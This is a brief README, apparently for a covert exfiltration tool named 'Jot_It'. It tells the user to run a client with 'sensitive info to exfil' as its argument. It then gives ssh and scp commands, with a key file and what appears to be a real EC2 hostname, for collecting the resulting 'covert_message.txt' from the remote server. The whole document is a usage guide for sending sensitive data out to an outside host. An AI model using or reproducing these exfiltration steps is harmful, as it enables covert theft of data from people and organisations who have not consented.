### Installation

* Server already up, just need to run client executable


## Usage

1. Start the client
```sh
/pathToClient/client 'senstiveInformationToExfil'
```
Replace pathToClient with the path to client executable; replace senstiveInformationToExfil with sensitive info

## Accessing the message

1. Configure Key
```sh
chmod 600 Jot_It_passkey.pem
```

2. SSH into server
```sh
ssh -i /pathToKey/Jot_It_passkey.pem ubuntu@ec2-34-215-236-80.us-west-2.compute.amazonaws.com
```
replace pathToKey with path to Jot_It_passkey.pem

3. Message located in /home/ubuntu/Jot_it/covert_message.txt

4.  Alternatively, could download the message with
```sh
scp -i /pathToKey/Jot_It_passkey.pem ubuntu@ec2-34-215-236-80.us-west-2.compute.amazonaws.com:/home/ubuntu/Jot_it/covert_message.txt ./covert_message.txt
```
replace pathToKey with path to Jot_It_passkey.pem


